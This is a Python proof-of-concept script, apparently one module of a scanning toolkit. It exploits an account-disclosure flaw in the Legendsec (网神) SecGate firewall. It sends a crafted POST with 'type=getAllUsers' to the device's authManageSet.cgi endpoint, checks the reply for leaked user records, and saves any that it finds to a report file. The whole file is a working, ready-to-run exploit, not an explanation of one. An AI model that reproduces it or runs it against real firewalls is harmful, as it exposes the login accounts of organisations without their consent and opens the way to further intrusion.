import requests
import time
import buter
import wirtefile

info = "网神防火墙用户登录账号泄露"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/cgi-bin/authUser/authManageSet.cgi'
data = '''type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc'''
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "DNT": "1"
    }

def SecGateuserLeakage(url):
    try:
        reps = requests.post(url=url+poc, headers=headers, data=data, verify=False, timeout=10)
        if reps.status_code == 200 and '<cell>' in reps.text:
            print(buter.colors.GREEN+  f"存在{info} url : {url}" + buter.colors.END)
            reptext = reps.url + "\n" + reps.text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
